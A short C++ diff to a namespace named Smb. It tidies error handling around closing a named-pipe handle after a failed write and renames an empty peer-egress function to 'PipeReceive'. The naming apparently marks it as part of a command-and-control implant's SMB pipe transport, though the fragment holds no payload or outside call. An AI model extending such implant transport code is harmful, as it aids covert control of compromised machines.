@@ -403,16 +403,19 @@ namespace Smb {
 
         if (!PipeWrite(Ctx->transport.pipe_handle, out)) {
             if (ntstatus == ERROR_NO_DATA) {
-                Ctx->nt.NtClose(Ctx->transport.pipe_handle);
+
+                if (Ctx->transport.pipe_handle) {
+                    Ctx->nt.NtClose(Ctx->transport.pipe_handle);
+                }
+                success_(false);
             }
-            success_(false);
         }
 
         defer:
         return success;
     }
 
-    VOID PeerConnectEgress(_stream *out, _stream **in) {
+    VOID PipeReceive(_stream **in) {
         HEXANE
 
     }
